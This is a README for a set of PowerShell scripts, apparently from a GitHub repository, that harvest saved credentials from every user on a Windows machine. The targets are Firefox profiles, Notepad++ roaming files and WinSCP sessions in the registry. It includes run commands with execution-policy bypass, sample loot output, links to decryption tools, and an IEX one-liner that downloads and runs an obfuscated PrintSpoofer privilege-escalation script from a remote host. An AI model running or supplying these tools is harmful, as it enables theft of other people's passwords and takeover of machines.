A set of scripts to help gathering credentials from Windows devices, especially usefull if there are hundreds of users on the machine.

The scripts should be run as a **high privileged user** to gather as much information as possible.

---

# firefox_dump.ps1
This script will loop through all users under `C:\Users` and dump all saved credentials from Mozilla Firefox profiles. 
## Example Usage
```powershell
PS E:\devop-scripts> powershell.exe -ExecutionPolicy Bypass .\firefox_dump.ps1
[-] 'Public' doesn't have any saved passwords in Mozilla Firefox
[+] Dumping secrets from 'user' to: C:\Users\void\AppData\Local\Temp\user\firefox\ahf32hh2.default-release
[+] Dumping secrets from 'user2' to: C:\Users\void\AppData\Local\Temp\user2\firefox\plhh3lmm.default-release
[-] 'user3' doesn't have any saved passwords in Mozilla Firefox
[+] Dumping secrets from 'void' to: C:\Users\void\AppData\Local\Temp\void\firefox\plmxz1zm.default-release
```

If you don't want to upload files to the target host simply copy-paste the try-catch code from the script and run it as is in PowerShell.
Decrypt the information with  [`firefox_decrypt.py`](https://github.com/unode/firefox_decrypt) or similar.
```bash
┌──(void㉿void)-[/opt/firefox_decrypt]
└─$ ./firefox_decrypt.py /tmp/firefox-loot/user1            

Website:   http://localhost:8000
Username: 'dev-user'
Password: 'D3velopm3ntM@st3rK3y*!'
```
---

# notepad_dump.ps1
This script will loop through all users under `C:\Users` and dump all roaming text files from Notepad++. 
## Example Usage
```powershell
PS E:\devop-scripts> powershell.exe -ExecutionPolicy Bypass .\notepad_dump.ps1
[-] 'Public' doesn't have any roaming Notepad++ data.
[+] Dumping Notepad++ data from 'user' to: C:\Users\void\AppData\Local\Temp\user\notepad++
[+] Dumping Notepad++ data from 'user2' to: C:\Users\void\AppData\Local\Temp\user2\notepad++
[-] 'user3' doesn't have any roaming Notepad++ data.
[+] Dumping Notepad++ data from 'void' to: C:\Users\void\AppData\Local\Temp\void\notepad++
```

---

# winscp_dump.ps1
This script will loop through all users in the registry (HKLM) and dump all saved winscp sessions.
## Exampe Usage
```powershell
PS E:\devop-scripts> powershell.exe -ExecutionPolicy Bypass .\winscp_dump.ps1
[+] User: void - Session: root@127.0.0.1
  HostName: 127.0.0.1
  UserName: root
  EncPassword: A35C745EFEDC2E3333286D6E6B726C726C726D0834352F152F11250F393F2E39280C3D2F2F2B387D7E7F6D7D7E7F5B3C20AF

[+] Saved all output to logfile: C:\Users\void\AppData\Local\Temp\winscp_dump.log
```

Decrypt the encrypted password with [`WinSCPDec.py`](https://gist.github.com/tijldeneut/69717c56de3e16e97516a1964fa49bfd) or similar.
```bash
apt-kali :: ~ » python3 WinSCPDec.py --host=127.0.0.1 --user=root --pass=A35C745EFEDC2E3333286D6E6B726C726C726D0834352F152F11250F393F2E39280C3D2F2F2B387D7E7F6D7D7E7F5B3C20AF
[+] Succes!
     ThisIsMySecretPasswd!"#1!"#
```

---

# obf_ps.ps1
Obfuscated PrintSpoofer script.
```powershell
> powershell -nop -ExecutionPolicy Bypass -c "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/0xPThree/Windows-Harvesting/refs/heads/main/obf_ps.ps1')"
[-] Please specify a command to execute

## If error: "The request was aborted: Could not create SSL/TLS secure channel."
> [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 
```
